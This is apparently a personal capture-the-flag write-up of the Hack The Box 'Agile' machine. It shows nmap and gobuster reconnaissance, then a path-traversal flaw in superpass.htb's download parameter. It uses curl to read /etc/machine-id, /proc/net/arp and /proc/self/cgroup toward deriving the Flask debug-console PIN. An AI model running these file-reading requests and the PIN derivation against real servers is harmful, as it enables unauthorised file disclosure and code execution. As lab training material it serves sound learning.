## Table of Contents

  - [Recon - nmap](#Recon\-\nmap)
    - [Directory Enumeration with GoBuster](#Directory\Enumeration\with\GoBuster)
      - [Vulnerabilty found in /download](#Vulnerabilty\found\in\/download)
    - [Flask Debug Execution](#Flask\Debug\Execution)
      - [Background](#Background)
      - [Example](#Example)
      - [Linux Paths For Cheat sheet](#Linux\Paths\For\Cheat\sheet)

#cicdworkflow #agile #HTB #writeups #CVE-2023-22809 #htmx


## Recon - nmap
```bash
>$ nmap -p- --min-rate 10000 --open 10.10.11.203 -oN agile-init.scan
----------------------------------------------------------------------
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-05 03:05 EST
Nmap scan report for 10.10.11.203
Host is up (0.055s latency).
Not shown: 65081 closed tcp ports (conn-refused), 452 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Moving on with port enumeration...
```bash
nmap -p22,80 -sCV 10.10.11.203 -oN agile-scv.scan
----
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 (ECDSA)
|_  256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://superpass.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
`superpass.htb` - domain found... Nice lets add this to `/etc/hosts` so out browser can recognize the hostname.
```bash
echo '10.10.11.203 superpass.htb' | sudo tee -a /etc/hosts
```

- Starting burpsuite to log requests in the background for any funky functionality

### Directory Enumeration with GoBuster
```bash
gobuster dir -u http://superpass.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
----------------------------------------------------------------------
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://superpass.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/download             (Status: 302) [Size: 249] [--> /account/login?next=%2Fdownload]
/static               (Status: 301) [Size: 178] [--> http://superpass.htb/static/]
/vault                (Status: 302) [Size: 243] [--> /account/login?next=%2Fvault]
```
Directories Found:
- `/download`
- `/static`
- `/vault`
```bash
┌──(kali㉿kali)-[~/Desktop/HTBSTUFF/HTB5/Agile]
└─$ curl -s -v http://superpass.htb/download
*   Trying 10.10.11.203:80...
* Connected to superpass.htb (10.10.11.203) port 80
> GET /download HTTP/1.1
> Host: superpass.htb
> User-Agent: curl/8.4.0
> Accept: */*
> 
< HTTP/1.1 302 FOUND
< Server: nginx/1.18.0 (Ubuntu)
< Date: Tue, 05 Dec 2023 08:28:49 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 249
< Connection: keep-alive
< Location: /account/login?next=%2Fdownload
< Vary: Cookie
< Set-Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIlBsZWFzZSBsb2cgaW4gdG8gYWNjZXNzIHRoaXMgcGFnZS4iXX1dfQ.ZW7fQQ.AwBNBKV4fcQMNXuqexFWk1jm9IU; HttpOnly; Path=/
< 
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/account/login?next=%2Fdownload">/account/login?next=%2Fdownload</a>. If not, click the link.
* Connection #0 to host superpass.htb left intact
```
- `JWT` Session token
- `nginx/1.18.0`
![[Pasted image 20231205033218.png]]
- Pretty quicky gave up on the JWT aspect... Not sure exactly what I was going for here exactly but I'll leave it...

#### Vulnerabilty found in /download
When looking through the `burpsuite` HTTP History while clicking around the site and exporting the file to a `.csv`, I noticed the `fn` query. 

When viewing `/download` you will be met with a `Flask` error page. So this means at least the following:
- Site is built using `flask`
- it is running in `debug` mode. This is good... Very good.
![[Pasted image 20231205034240.png]]

....
![[Pasted image 20231205034312.png]]
Lil bit of LFI Fuzzing and after the 4th try:
![[Pasted image 20231205035729.png]]
Notes:
- `corum`
- `edwards`
- `dev_admin`
Have shells, indicating they can log in.

`runner` has a custom home directory `/app/app-testing`

### Flask Debug Execution

#### Background

The debug page for Flask is made for developers to find a crash and figure out what happened. It gives not only the stack trace, but also the ability to get a Python console and run additional commands at the point of the crash
- It is possible to derive the pin based off of information given from the debug page, but first i want the site's source code for further enumeration
At this point in time here are the different methods of attack:
- Get Source Code of site (Leaked from debug page)

- inspect `__init__.py` file
- `/usr/local/lib/python3.5/dist-packages/flask/app.py`


```python
probably_public_bits = [
    'web3_user',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.5/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
]
```
`username` - user who started this Flask app
`modname` - flask.app
`getattr(app, '__name__', getattr(app .__class__, '__name__'))` is flask
`getattr(mod, '__file__', None)` is the **absolute path of** `app.py` in the flask directory (e.g. `/usr/local/lib/python3.5/dist-packages/flask/app.py`). If `app.py` doesn't work, **try** `app.pyc`

use `--path-as-is` so that `curl` doesn’t undo the `../`
- to get the username for deriving PIN, check `/proc/self/environ`
**private_bits**

```bash
uuid.getnode() is the MAC address of the current computer, str(uuid.getnode()) is the decimal expression of the mac address.

To find server MAC address, need to know which network interface is being used to serve the app (e.g. ens3). If unknown, leak /proc/net/arp for device ID and then leak MAC address at /sys/class/net/<device id>/address.
```
#### Example
```bash
┌──(kali㉿kali)-[~/Desktop/HTBSTUFF/HTB5/Agile]
└─$ curl --cookie "session=.eJwljjkOwzAMBP-iOgUl89D6M4Ypk0haO66C_D0CMt3ONvMpW55xPcv6Pu94lO11lLX4PjQWHo05UclF9l4dIzJkYDjVXMCwLj5v6RqEMDokxCbugtbC0xarXdVdAZoaDeyszCpCJgrXRpYNu3OlqqFzpxxlhtxXnP8alO8PgbAtvg.ZW7bMg.5Qr_uTsKl4D6-VFfb6TXvqwObNc" http://superpass.htb/download?fn=../../../../proc/net/arp -o anv     
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   156  100   156    0     0    933      0 --:--:-- --:--:-- --:--:--   939
                                                                                                
┌──(kali㉿kali)-[~/Desktop/HTBSTUFF/HTB5/Agile]
└─$ cat anv                  
IP address       HW type     Flags       HW address            Mask     Device
10.10.10.2       0x1         0x2         00:50:56:b9:f4:52
```
- Convert from hex to decimal

```sh
python -c 'print(0x005056b9f453)'                                   
345052410963
```


```bash
curl --cookie "session=.eJwljjkOwzAMBP-iOgUl89D6M4Ypk0haO66C_D0CMt3ONvMpW55xPcv6Pu94lO11lLX4PjQWHo05UclF9l4dIzJkYDjVXMCwLj5v6RqEMDokxCbugtbC0xarXdVdAZoaDeyszCpCJgrXRpYNu3OlqqFzpxxlhtxXnP8alO8PgbAtvg.ZW7bMg.5Qr_uTsKl4D6-VFfb6TXvqwObNc" http://superpass.htb/download?fn=../../../../etc/machine-id          

OUTPUT:
      
ed5b159560f54721827644bc9b220d00
```

Now we also need the first line of `/proc/self/cgroup` from the last "/" to the end.

```bash
 curl --cookie "session=.eJwljjkOwzAMBP-iOgUl89D6M4Ypk0haO66C_D0CMt3ONvMpW55xPcv6Pu94lO11lLX4PjQWHo05UclF9l4dIzJkYDjVXMCwLj5v6RqEMDokxCbugtbC0xarXdVdAZoaDeyszCpCJgrXRpYNu3OlqqFzpxxlhtxXnP8alO8PgbAtvg.ZW7bMg.5Qr_uTsKl4D6-VFfb6TXvqwObNc" http://superpass.htb/download?fn=../../../../proc/self/cgroup  
 ---------
 OUTPUT
       
0::/system.slice/superpass.service
```
**We only need the `superpass.service` part**










#### Linux Paths For Cheat sheet
`/proc/self/cgroup`
`/proc/sys/kernel/random/boot_id` 


```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:                                                                                                  
    global _machine_id

    if _machine_id is not None:
        return _machine_id

    def _generate() -> t.Optional[t.Union[str, bytes]]:
        linux = b""

        # machine-id is stable across boots, boot_id is not.
        for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id": 
            try:
                with open(filename, "rb") as f:
                    value = f.readline().strip()
            except OSError:
                continue

            if value:
                linux += value
                break

        # Containers share the same machine id, add some cgroup
        # information. This is used outside containers too but should be
        # relatively stable across boots.
        try:
            with open("/proc/self/cgroup", "rb") as f:
                linux += f.readline().strip().rpartition(b"/")[2]
        except OSError:
            pass

        if linux:
            return linux

        # On OS X, use ioreg to get the computer's serial number.
        try:
```

















